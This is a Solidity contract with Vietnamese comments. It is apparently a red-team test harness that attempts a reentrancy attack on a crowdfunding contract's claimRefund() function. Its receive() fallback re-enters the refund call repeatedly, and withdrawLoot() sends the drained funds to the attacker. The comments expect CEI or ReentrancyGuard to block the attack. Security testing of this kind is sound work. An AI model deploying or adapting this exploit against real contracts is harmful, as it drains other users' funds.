// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./ProjectCore.sol";

/// @title AttackCrowdfund — Hop dong Red Team thu nghiem tan cong tai nhap vao ProjectCore
/// @notice Thu hien thuc hoa Reentrancy Attack vao ham claimRefund() khi chien dich that bai
contract AttackCrowdfund {
    ProjectCore public targetContract;
    address public owner;
    uint256 public attackCount;

    event AttackAttempted(uint256 indexed attemptNumber, uint256 contractBalance);
    event AttackSucceeded(uint256 stolenAmount);
    event AttackFailed(string reason);

    constructor(address payable _target) {
        targetContract = ProjectCore(_target);
        owner = msg.sender;
    }

    /// @notice Buoc 1: Dong gop von hop le vao chien dich
    function pledgeInitial() external payable {
        targetContract.pledge{value: msg.value}();
    }

    /// @notice Buoc 2: Goi claimRefund() de kich hoat luong hoan tien va don nhan fallback receive()
    function initiateAttack() external {
        attackCount = 0;
        targetContract.claimRefund();
    }

    /// @notice Ham nhan tien tu dong goi lai claimRefund() nham rut can quy
    receive() external payable {
        attackCount++;
        emit AttackAttempted(attackCount, address(targetContract).balance);

        // Kẻ tấn công cố gọi lại claimRefund() khi còn số dư trong hợp đồng đích
        if (address(targetContract).balance > 0 && attackCount < 10) {
            try targetContract.claimRefund() {
                // Neu goi thanh cong -> tiep tuc reenter
            } catch {
                // Neu bi chan boi CEI hoac nonReentrant -> phat su kien ghi nhan
                emit AttackFailed("Reentrancy bi chan boi CEI hoac ReentrancyGuard");
            }
        }
    }

    /// @notice Rut toan bo tien trong hop dong tan cong ve vi ke chu muu
    function withdrawLoot() external {
        require(msg.sender == owner, "Khong phai chu");
        (bool ok, ) = payable(owner).call{value: address(this).balance}("");
        require(ok, "Rut tien that bai");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
